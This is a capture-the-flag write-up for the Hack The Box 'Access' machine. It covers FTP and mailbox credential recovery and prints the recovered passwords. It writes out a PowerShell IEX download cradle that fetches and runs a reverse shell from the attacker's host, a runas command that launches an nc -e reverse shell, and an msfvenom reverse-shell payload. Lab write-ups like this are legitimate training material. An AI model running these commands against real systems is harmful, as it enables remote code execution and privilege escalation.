---
title: 'HTB-Access'
published: 2025-09-18
draft: false
toc: true
---

---

```
Scope:
10.10.10.98
```

# Recon
## Nmap

```bash
sudo nmap -sV -sC -sT -p- access.htb -T5 --min-rate=5000 -vvvv -Pn

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  syn-ack Microsoft Windows XP telnetd (no more connections allowed)
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

I noticed that `ftp` was readable using anon access.

## 21/TCP - FTP

![](attachments/54b370d5bcef4485586f6a4e1d83b31c.png)

I found the `backup.mdb` file inside the `Backups` directory which I transferred over and analyzed it using `strings`:

![](attachments/3f7743725803bdcb511fba908e85bc9d.png)

As well as the `Access Control.zip` file inside the `Engineer` directory.

### zip file

This latter file was password protected:

![](attachments/84b37cd4fe565153fb3a27ae6945c4f6.png)

We can try to crack it using `zip2john`

![](attachments/7d3686d02b1bc6ae02a422cb8bdef364.png)

However this did not work:

![](attachments/2b68341638616b8660bc288fc761760a.png)

Instead I went ahead and used the output of the `backup.mdb` file in combination with `strings` to create a password list which I then would use to crack the password:

![](attachments/82a0e7ac43076337db6e9ad581ebb0fd.png)

```
access4u@security
```

I used this password to open up the zip file which extracted the `Access Control.pst` file:

![](attachments/b1d5f39bfb2744f0aa76ab678de0ef24.png)

### .pst file

I had to look up what a `.pst`  file extension even was:

![](attachments/5cb35d78ed41dd44e2fab2c70923fb22.png)

We can use the `readpst` binary to read it:

![](attachments/14554f4d3cd4518f5424793832ac28df.png)

We can now go ahead and use `cat` to read the contents of the newly created file:

![](attachments/1c311371c154a5501962388f9ee6b79d.png)

![](attachments/4dea09dd9698f15467697e207d2b691f.png)

```
security
4Cc3ssC0ntr0ller
```

# Foothold
## 23/TCP - Telnet

Using `telnet` we were able to get ez access:

![](attachments/b86adbc28742540c64f52d99a3e14c10.png)

### user.txt

I then went on to get the `user.txt` flag:

![](attachments/cf8342378f4a5a449e501272609ba8d5.png)

## Enumeration

![](attachments/824c092d343db9d06f8115ec1a21dcbe.png)

I found some interesting directories inside the `C:\` drive.

![](attachments/2d6ed6e0176658f4cc2be319d7785ac8.png)

I then wanted to do some automated enum but got blocked:

![](attachments/3838fc4c2409d6d7f9b9c0963c686a32.png)

The group policy wouldn't let me.

However I could execute `powershell` commands:

![](attachments/873aff63ceadfc9839385ee5886206b9.png)

So I then used this `powershell` reverse shell where I appended the following:

![](attachments/b2233f38d95c81fbef914560ecfcccd2.png)

![](attachments/2ce3e5b0b80d9e371ffbef68d26dde39.png)

Then using the following command I don't have to manually trigger the shell anymore, it get's executed on download:

```powershell
powershell "IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.6/shell.ps1')"
```

![](attachments/822a629ab66dcd9c7315d3578ae153c9.png)

# Privilege Escalation
## Stored Creds

Using the `cmdkey /list` command we figure out that there are stored creds for the *Administrator* on the machine:

![](attachments/2cba3d37748efec9c75ba5077321068a.png)

Since these creds should give us direct access as the *Admin* we can abuse this using the `runas` command.

```powershell
runas /savecreds /user:ACCESS\Administrator "nc.exe 10.10.14.6 443 -e bash"
```

Unfortunately it connected but instantly kicked us off:

![](attachments/4546f3b83ae37400fa19e926ba26e743.png)

We need something with more persistence.

### msfvenom

Using the following `msfvenom` payload the shell stayed up and I had elevated access:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f exe > shell.exe
```

![](attachments/be80456a573c0abfbab7ccaa29d9801f.png)

### root.txt

![](attachments/e63af1e0932f73b3f61474447f3ca986.png)

![](attachments/2fe171a0d27a4716a0d830d18154bc99.png)

---
